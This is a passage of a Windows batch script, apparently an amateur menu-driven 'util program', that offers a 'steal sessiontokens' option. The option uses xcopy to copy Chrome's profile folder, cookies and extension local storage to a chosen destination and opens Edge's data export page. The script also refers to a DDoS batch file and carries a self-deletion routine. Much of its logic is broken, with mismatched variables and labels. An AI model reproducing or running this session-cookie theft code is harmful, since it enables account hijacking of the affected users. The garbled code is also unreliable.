echo # pc cracked free.
echo # press any key to return to the main menu.
pause >null
del null
goto mainmenu
 
:6
title %titlename% - %connectionstate% - starting godmode folder
cls
start explorer shell:::{ED7BA470-8E54-465E-825C-99712043E01C}
echo # The God Mode has been started
pause >null
goto mainmenu
 
:exit
title %titlename% - disconnecting... - exiting
cls
del ddos1.bat
echo # deleting ddos1.bat... 
del null
echo # deleting null...
timeout 1 /nobreak >null
del null
exit

:7
:: end_des
set /P enddes=Whats the end destenation?-
:7.1
title %titlename% - %connectionstate% - steal sessiontokens
cls
echo # 
echo # the session tokens will be saved at %enddes%
echo # Select browser to steal session tokens:
echo # 
echo # 
echo # 1 - Edge
echo # 2 - Chrome
echo # 3 - Both
echo # 4 - Change the destination
echo # 5 - Exit
pause
set choicefor7='' >null
set /p choice=#-[
if '%choicefor7%'=='1' goto 7.both
if '%choicefor7%'=='2' goto 7.chrome
if '%choicefor7%'=='3' goto 7.edge
if '%choicefor7%'=='4' goto 7.change
if '%choicefor7%'=='5' goto mainmenu

cls
goto 7.1


:7.Change
cls
echo #
echo # The destination at the moment is : "%enddes%"
echo #
set /p enddes= # [
echo # saved!
timeout 1 >null
goto 7.1


:7.Chrome
title %titlename% - %connectionstate% - steal sessiontokens - Chrome
cls
echo #
echo # procces has started
xcopy "%USERPROFILE%\AppData\Local\Google" "%end_des%" /e /i /h /y
echo # [==50%___]
echo #
xcopy "%USERPROFILE%\AppData\Local\Google" "%end_des%" /e /i /h /y
cls
echo #
echo # procces has started
echo # [==100%==]
echo #
echo # Done!
echo # The sessiontokens has been saved to "%end_des%"
echo #
echo # press any key to return to the main menu.
pause >null
goto mainmenu

:7.Edge
title %titlename% - %connectionstate% - steal sessiontokens - Edge
cls
start microsoft-edge:https://edge://settings/profiles/your-profile-name/exportData
echo #
echo # Press any key to return to the mainmenu.
pause >null
goto mainmenu
:7.Both
title %titlename% - %connectionstate% - steal sessiontokens - Both
cls
echo #
echo # procces for chrome
echo #
echo # procces has started
xcopy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Local Storage\chrome-extension_*_0.localstorage" "%end_des%" /e /i /h /y
echo # [==50%___]
echo #
xcopy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Cookies" "%end_des%" /e /i /h /y
cls
echo #
echo # procces has started
echo # [==100%==]
echo #
echo # Done!
echo # The sessiontokens has been saved to "%end_des%"
timeout 3
cls
echo #
echo # Edge
start microsoft-edge:https://edge://settings/profiles/your-profile-name/exportData
echo #
echo # Press any key to return to the mainmenu.
pause >null
goto mainmenu

:D
cls

:Dmenuconfirm
title %titlename% - %connectionstate% - Debugmenuconfirm
echo #  X========================X
echo #  [ menu  debugmenuconfirm ]
echo #  X========================X
echo # 
echo # are you sure that you want to acces the debug
echo # y for yes
echo # n for no
echo #
choice /c yn

if errorlevel 1 goto Dmenuboot
if errorlevel 2 goto mainmenu

:Dmenuboot
title %titlename% - %connectionstate% - Dmenuboot
cls

echo #
echo # 5 = exit to main menu
echo # 1 = view the no connection menu
echo # 2 = change variables
echo # 3 = del util_program.bat
echo # 4 = Exit /b
echo #
choice /c 1234 /m # & echo # 

if errorlevel 5 goto mainmenu
if errorlevel 4 exit /b
if errorlevel 3 goto Dexit
if errorlevel 2 goto D.variables
if errorlevel 1 goto to_many_fails.wait.d
:to_many_fails.wait.d

goto to_many_fails

:D.variables
title %titlename% - %connectionstate% - Dmenuboot - D.variables
cls
echo # available variables to edit:
echo # - - variable name         - variable at the moment
echo # 1 - %%connectionstate%%   - %connectionstate%
echo # 2 - %%titlename%%         - %titlename%
echo # 3 - %%num%%               - %num%
echo # ( if a space is empty, then it hasn't been set by 
echo # the batch file)
echo # X=================================================X
echo #
echo # e - exit
echo #
choice /c 123e & echo # 

if errorlevel 4 goto Dmenuboot
if errorlevel 3 goto D.edit.n
if errorlevel 2 goto D.edit.t
if errorlevel 1 goto D.edit.c

:D.edit.c
title %titlename% - %connectionstate% - Dmenuboot - D.variables - edit.c
cls
echo (
    echo( #
    echo( # editing 'connectionstate'
    set /p connectionstate="# - "
    echo( #
)
echo done!
pause >null
goto D.variables

:D.edit.t
title %titlename% - %connectionstate% - Dmenuboot - D.variables - edit.t
cls
echo (
    echo( #
    echo( # editing 'titlename'
    set /p titlename="# -"
    echo( #
)
echo done!
pause >null
goto D.variables

:D.edit.n
title %titlename% - %connectionstate% - Dmenuboot - D.variables - edit.n
cls
echo (
    echo( #
    echo( # editing 'num'
    set /p num="# -"
    echo( #
)
echo done!
pause >null
goto D.variables

:Dexit
title %titlename% - %connectionstate% - Dmenuboot - Dexit
cls
start cmd
echo on
cls
del null
del "C:\Users\%user%\Downloads\util_program.bat"
del "C:\Users\%user%\Downloads\util_program (1).bat"
del "util_program.bat"
set count=1
:delloop
del "C:\Users\%user%\Downloads\util_program (%count%).bat"
del "util_program (%count%).bat"
if %count% GTR 20 (
  goto above20debug
)
set /a count=count+1
goto delloop

:above20deldebug
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('util_program.bat couldn't find itself and terminate it. Please delete it manually.)}"
exit /b
